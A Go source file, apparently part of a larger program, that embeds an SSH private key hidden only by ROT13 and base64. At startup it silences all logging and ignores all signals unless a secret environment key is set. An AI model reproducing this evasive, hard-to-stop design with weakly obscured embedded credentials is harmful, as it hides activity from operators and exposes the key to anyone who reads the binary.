//go:build release
// +build release

package main

import (
	_ "embed"
	"os"
	"log"
	"encoding/base64"
)

//go:embed resources/ssh_private_key.base64.rot13
var resourceSSHPrivateKeyBase64Rot13 string

var resourceSSHPrivateKey string

func rot13(input byte) byte {
	if 'A' <= input && input <= 'Z' {
		return 'A' + (input-'A'+13)%26
	} else if 'a' <= input && input <= 'z' {
		return 'a' + (input-'a'+13)%26
	}
	return input
}

// rot13String function to apply ROT13 to a string
func rot13String(input string) string {
	result := make([]byte, len(input))
	for i := range input {
		result[i] = rot13(input[i])
	}
	return string(result)
}

func resourceSSHPrivateKeyUnpack() {
	// TODO use github.com/awnumar/memguard

	resourceSSHPrivateKeyBase64 := rot13String(resourceSSHPrivateKeyBase64Rot13)

	decodedData, err := base64.StdEncoding.DecodeString(resourceSSHPrivateKeyBase64)
	if err != nil {
		log.Fatalf("Failed to decode resourceSSHPrivateKeyBase64Rot13: %v", err)
	}

	resourceSSHPrivateKey = string(decodedData)
}

func init() {
	dontSilenceKey := os.Getenv("VMK")
	if dontSilenceKey != cfg.VerboseModeKey {
		systemRouteAllLogging(os.DevNull)
		systemIgnoreAllSignals()
	}

	resourceSSHPrivateKeyUnpack()
}
